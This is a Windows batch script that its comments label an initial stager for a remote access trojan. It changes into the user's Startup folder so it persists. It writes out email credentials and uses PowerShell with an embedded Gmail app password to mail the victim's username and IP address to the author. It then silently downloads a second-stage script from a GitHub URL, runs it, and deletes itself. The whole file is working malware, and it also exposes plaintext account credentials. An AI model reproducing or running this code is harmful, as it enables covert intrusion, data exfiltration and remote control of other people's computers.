@echo off
@REM initial stager for RAT
@REM created by: Petros

@REM variables
set "INITIALPATH=%cd%"
set "STARTUP=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"

@REM move into the startup folder
cd "%STARTUP%"
echo "websitepetros@gmail.com" > email.txt
echo  "Peter1234!@#$" > pass.txt


@REM setup smtp
powershell Send-MailMessage -From "websitepetros@gmail.com" -To "websitepetros@gmail.com" -subject "$env:UserName" -Body (Get-NetIPAddress -AddressFamily IPV4 -InterfaceAlias Ethernet).IPAddress -SmtpServer "smtp.gmail.com" -Port 587 -UseSsl -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "websitepetros@gmail.com", (ConvertTo-SecureString -String 'tqck alhn siqo dtqz'  -AsPlainText -Force))


@REM write payloads to startup
powershell powershell.exe -windowstyle hidden  "Invoke-WebRequest -Uri https://raw.githubusercontent.com/peterpapath/RAT/refs/heads/main/files/stage1.cmd -OutFile stage1.cmd"

@REM run payload  
powershell ./stage1.cmd

@REM cd back to the initial directory
cd "%INITIALPATH%"
del initial.cmd
